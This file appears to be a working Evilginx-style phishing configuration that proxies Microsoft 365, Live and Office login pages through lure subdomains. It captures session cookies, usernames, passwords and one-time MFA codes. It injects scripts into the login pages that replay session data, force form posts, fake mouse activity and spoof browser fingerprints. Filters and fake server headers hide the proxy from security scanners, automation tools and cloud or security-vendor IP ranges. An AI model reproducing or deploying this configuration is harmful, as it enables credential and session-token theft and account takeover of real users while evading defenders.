min_ver: "3.3.0"

proxy_hosts:
  - {
      phish_sub: "secure",
      orig_sub: "login",
      domain: "microsoftonline.com",
      session: true,
      is_landing: true,
      ssl: true,
      chain_ssl: true,
      force_post: true,
    }
  - {
      phish_sub: "auth",
      orig_sub: "login",
      domain: "live.com",
      session: true,
      is_landing: false,
      ssl: true,
      force_post: true,
    }
  - {
      phish_sub: "portal",
      orig_sub: "www",
      domain: "office.com",
      session: true,
      is_landing: false,
      ssl: true,
    }

auth_tokens:
  - domain: ".live.com"
    keys:
      [
        "ESTSAUTH",
        "ESTSAUTHPERSISTENT",
        "MSPAuth",
        "MSPOK",
        "MSCC",
        "x-ms-gateway-slice",
        "SignInStateCookie",
      ]
  - domain: "login.microsoftonline.com"
    keys:
      [
        "MSAuthToken",
        "fpc",
        "stsservicecookie",
        ".*_sessid",
        "MSPAuth",
        "MSPOK",
      ]
  - domain: ".office.com"
    keys: ["FedAuth", "OfficeSessionToken", "MSAuth", ".*_sessionid"]

credentials:
  username:
    key: "loginfmt"
    search: "(.*)"
    type: "post"
    force_post: true
  password:
    key: "passwd"
    search: "(.*)"
    type: "post"
    force_post: true
  otp:
    key: "otc"
    search: "(.*)"
    type: "post"
    force_post: true
  context:
    key: "ctx"
    search: "(.*)"
    type: "post"
    force_post: true

sub_filters:
  - triggers_on: "login.microsoftonline.com"
    orig_sub: "login"
    domain: "microsoftonline.com"
    search: "var sCtx = {"
    replace: |
      if (/(MSPAuth|ESTSAUTH|MSAuthToken)=[^;]/.test(document.cookie)) {
        var sCtx = {__phish_ctx__: true, "MSPAuth": (document.cookie.match(/(?:^|;\s*)MSPAuth=([^;]*)/)?.pop())};
        fetch(window.location.href, {
          method: 'POST',
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: new URLSearchParams(window.location.search.slice(1))
        });
      } else {
        var sCtx = {__phish_ctx__: true};
      }
    mimes: ["text/html"]

  - triggers_on: "login.microsoftonline.com"
    orig_sub: "login"
    domain: "microsoftonline.com"
    search: 'window.location.replace("https://www.office.com")'
    replace: |
      if (/(MSAuthToken|FedAuth)=[^;]/.test(document.cookie)) {
        setTimeout(() => {
          fetch(window.location.href, {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: new URLSearchParams(window.location.search.slice(1))
          }).then(() => {
            window.location.replace("https://www.office.com");
          });
        }, Math.random()*2000 + 1000);
      } else {
        setTimeout(() => window.location.reload(), 3000);
      }
    mimes: ["application/javascript"]

  - triggers_on: "login.microsoftonline.com"
    orig_sub: "login"
    domain: "microsoftonline.com"
    search: "</body>"
    replace: |
      <script>
        document.addEventListener('DOMContentLoaded', function() {
          document.forms.forEach(form => {
            if (!form.method || form.method.toLowerCase() === 'get') {
              form.method = 'post';
            }
          });
        });

        setInterval(() => {
          if (Math.random() > 0.7) {
            window.dispatchEvent(new MouseEvent('mousemove', {
              clientX: Math.random() * window.innerWidth,
              clientY: Math.random() * window.innerHeight
            }));
          }
        }, 3000 + Math.random() * 4000);
      </script>
      </body>
    mimes: ["text/html"]

  - triggers_on: "login.microsoftonline.com"
    orig_sub: "login"
    domain: "microsoftonline.com"
    search: "</head>"
    replace: |
      <script>
        Intl.DateTimeFormat = class extends Intl.DateTimeFormat {
          constructor(locales, options) {
            super(locales, {...options, timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone});
          }
        };

        Object.defineProperty(window, 'chrome', {
          value: {loadTimes: () => {}, csi: () => {}, app: {isInstalled: false}},
          configurable: false,
          enumerable: false,
          writable: false
        });

        // Ensure all form submissions are POST
        document.addEventListener('submit', function(e) {
          if (!e.target.method || e.target.method.toLowerCase() === 'get') {
            e.preventDefault();
            const formData = new FormData(e.target);
            const searchParams = new URLSearchParams(formData);
            fetch(e.target.action, {
              method: 'POST',
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: searchParams
            }).then(response => {
              if (response.redirected) {
                window.location.href = response.url;
              }
            });
          }
        });
      </script>
      </head>
    mimes: ["text/html"]

filters:
  - name: block_automation_tools
    type: user-agent
    action: deny
    patterns:
      - "(?i)(bot|crawler|scan|spider|burp|zap|nikto|python|curl|wget|postman|headless)"
      - 'Mozilla/5\\.0 \\(Windows NT 10\\.0; Win64; x64\\) AppleWebKit/537\\.36 \\(KHTML, like Gecko\\) Chrome/\\d+\\.\\d+\\.\\d+\\.\\d+ Safari/537\\.36'

  - name: block_infrastructure_ips
    type: ip
    action: deny
    patterns:
      - "8.8.8.8/32"
      - "1.1.1.1/32"
      - "52.96.0.0/12"
      - "104.16.0.0/13"
      - "192.42.116.0/24"
      - "20.190.128.0/18"
      - "13.107.0.0/16"
      - "34.0.0.0/8"

  - name: block_high_risk_countries
    type: geoip
    action: deny
    countries:
      - "RU"
      - "CN"
      - "IN"

  - name: prevent_bruteforce
    type: rate-limit
    requests: 4
    interval: 90
    action: redirect
    redirect_url: "/error/429"

security:
  - name: fake_tech_headers
    type: header
    action: add
    headers:
      - "Server: Microsoft-IIS/10.0"
      - "X-Powered-By: ASP.NET"

  - name: security_headers
    type: header
    action: add
    headers:
      - "X-Frame-Options: DENY"
      - "Content-Security-Policy: default-src 'self' *.microsoft.com *.microsoftonline.com *.live.com; script-src 'unsafe-inline' 'self' *.microsoft.com"
      - "Referrer-Policy: strict-origin-when-cross-origin"
      - "Permissions-Policy: geolocation=(), microphone=(), camera=()"

login:
  domain: "login.microsoftonline.com"
  path: "/common/login"
  delay: 1.5
  max_attempts: 3
  force_post: true
